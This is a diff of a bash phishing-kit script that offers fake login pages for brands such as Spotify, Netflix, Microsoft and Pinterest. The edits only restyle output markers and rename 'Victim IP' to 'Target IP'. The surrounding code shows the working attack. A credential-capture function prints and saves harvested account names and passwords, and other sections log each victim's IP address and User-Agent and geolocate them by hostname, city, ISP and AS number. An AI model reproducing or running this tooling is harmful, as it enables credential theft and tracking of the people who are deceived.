@@ -41,7 +41,7 @@ printf "\033[1;92m[\033[0m\033[1;77m6\033[0m\033[1;92m]\033[0m\033[1;93m Google\
 printf "\033[1;92m[\033[0m\033[1;77m7\033[0m\033[1;92m]\033[0m\033[1;93m Spotify\033[0m      \033[1;92m[\033[0m\033[1;77m16\033[0m\033[1;92m]\033[0m\033[1;93m Microsoft\033[0m\n"
 printf "\033[1;92m[\033[0m\033[1;77m8\033[0m\033[1;92m]\033[0m\033[1;93m Netflix\033[0m      \033[1;92m[\033[0m\033[1;77m17\033[0m\033[1;92m]\033[0m\033[1;93m Origin\033[0m\n"
 printf "\033[1;92m[\033[0m\033[1;77m9\033[0m\033[1;92m]\033[0m\033[1;93m InstaFollow\033[0m  \033[1;92m[\033[0m\033[1;77m18\033[0m\033[1;92m]\033[0m\033[1;93m Pinterest\033[0m\n"
-read -e -p $'\n\033[1;92m[\033[0m\033[1;77m+\033[0m\033[1;92m] Choose an option: \033[0m\en' option
+read -e -p $'\n\033[1;92m[\033[0m\033[1;77m>\033[0m\033[1;92m] Choose an option: \033[0m\en' option
 
 
 if [[ $option == 1 || $option == 01 ]]; then
@@ -283,8 +283,8 @@ catch_cred() {
 account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
 password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
-printf "\033[1;92m[\033[0m\033[0m*\033[0m\033[1;92m]\033[0m\033[1;92m Account:\033[0m\033[1;77m %s\n\033[0m" $account
-printf "\033[1;92m[\033[0m\033[0m*\033[0m\033[1;92m]\033[0m\033[1;92m Password:\033[0m\033[1;77m %s\n\033[0m" $password
+printf "\033[1;92m[\033[0m\033[0m+\033[0m\033[1;92m]\033[0m\033[1;92m Account:\033[0m\033[1;77m %s\n\033[0m" $account
+printf "\033[1;92m[\033[0m\033[0m+\033[0m\033[1;92m]\033[0m\033[1;92m Password:\033[0m\033[1;77m %s\n\033[0m" $password
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\033[1;92m[\033[0m\033[1;77m+\033[0m\033[1;92m] Saved:\033[0m\033[1;77m sites/%s/saved.usernames.txt\033[0m\n" $server
 sleep 0.5
@@ -297,8 +297,8 @@ touch sites/$server/saved.usernames.txt
 ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
-printf "\033[1;92m[\033[0m\033[0m*\033[0m\033[1;92m] Victim IP:\033[0m\033[1;77m %s\033[0m\n" $ip
-printf "\033[1;92m[\033[0m\033[0m*\033[0m\033[1;92m] User-Agent:\033[0m\033[1;77m %s\033[0m\n" $ua
+printf "\033[1;92m[\033[0m\033[0m+\033[0m\033[1;92m] Target IP:\033[0m\033[1;77m %s\033[0m\n" $ip
+printf "\033[1;92m[\033[0m\033[0m+\033[0m\033[1;92m] User-Agent:\033[0m\033[1;77m %s\033[0m\n" $ua
 printf "\033[1;92m[\033[0m\033[1;77m+\033[0m\033[1;92m] Saved:\033[0m\033[1;77m %s/saved.ip.txt\033[0m\n" $server
 cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
 
@@ -314,61 +314,61 @@ continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cu
 printf "\n"
 hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
 if [[ $hostnameip != "" ]]; then
-printf "\033[1;92m[\033[0m*\033[1;92m] Hostname:\033[0m\033[1;77m %s\033[0m\n" $hostnameip
+printf "\033[1;92m[\033[0m+\033[1;92m] Hostname:\033[0m\033[1;77m %s\033[0m\n" $hostnameip
 fi
 ##
 
 reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
 if [[ $reverse_dns != "" ]]; then
-printf "\033[1;92m[\033[0m*\033[1;92m] Reverse DNS:\033[0m\033[1;77m %s\033[0m\n" $reverse_dns
+printf "\033[1;92m[\033[0m+\033[1;92m] Reverse DNS:\033[0m\033[1;77m %s\033[0m\n" $reverse_dns
 fi
 ##
 
 
 if [[ $continent != "" ]]; then
-printf "\033[1;92m[\033[0m*\033[1;92m] IP Continent:\033[0m\033[1;77m %s\033[0m\n" $continent
+printf "\033[1;92m[\033[0m+\033[1;92m] IP Continent:\033[0m\033[1;77m %s\033[0m\n" $continent
 fi
 ##
 
 country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
 if [[ $country != "" ]]; then
-printf "\033[1;92m[\033[0m*\033[1;92m] IP Country:\033[0m\033[1;77m %s\033[0m\n" $country
+printf "\033[1;92m[\033[0m+\033[1;92m] IP Country:\033[0m\033[1;77m %s\033[0m\n" $country
 fi
 ##
 
 state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
 if [[ $state != "" ]]; then
-printf "\033[1;92m[\033[0m*\033[1;92m] State:\033[0m\033[1;77m %s\033[0m\n" $state
+printf "\033[1;92m[\033[0m+\033[1;92m] State:\033[0m\033[1;77m %s\033[0m\n" $state
 fi
 ##
 city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 
 if [[ $city != "" ]]; then
-printf "\033[1;92m[\033[0m*\033[1;92m] City Location:\033[0m\033[1;77m %s\033[0m\n" $city
+printf "\033[1;92m[\033[0m+\033[1;92m] City Location:\033[0m\033[1;77m %s\033[0m\n" $city
 fi
 ##
 
 isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 if [[ $isp != "" ]]; then
-printf "\033[1;92m[\033[0m*\033[1;92m] ISP:\033[0m\033[1;77m %s\033[0m\n" $isp
+printf "\033[1;92m[\033[0m+\033[1;92m] ISP:\033[0m\033[1;77m %s\033[0m\n" $isp
 fi
 ##
 
 as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 if [[ $as_number != "" ]]; then
-printf "\033[1;92m[\033[0m*\033[1;92m] AS Number:\033[0m\033[1;77m %s\033[0m\n" $as_number
+printf "\033[1;92m[\033[0m+\033[1;92m] AS Number:\033[0m\033[1;77m %s\033[0m\n" $as_number
 fi
 ##
 
 ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 if [[ $ip_speed != "" ]]; then
-printf "\033[1;92m[\033[0m*\033[1;92m] IP Address Speed:\033[0m\033[1;77m %s\033[0m\n" $ip_speed
+printf "\033[1;92m[\033[0m+\033[1;92m] IP Address Speed:\033[0m\033[1;77m %s\033[0m\n" $ip_speed
 fi
 ##
 ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 
 if [[ $ip_currency != "" ]]; then
-printf "\033[1;92m[\033[0m*\033[1;92m] IP Currency:\033[0m\033[1;77m %s\033[0m\n" $ip_currency
+printf "\033[1;92m[\033[0m+\033[1;92m] IP Currency:\033[0m\033[1;77m %s\033[0m\n" $ip_currency
 fi
 ##
 rm -rf iptracker.log
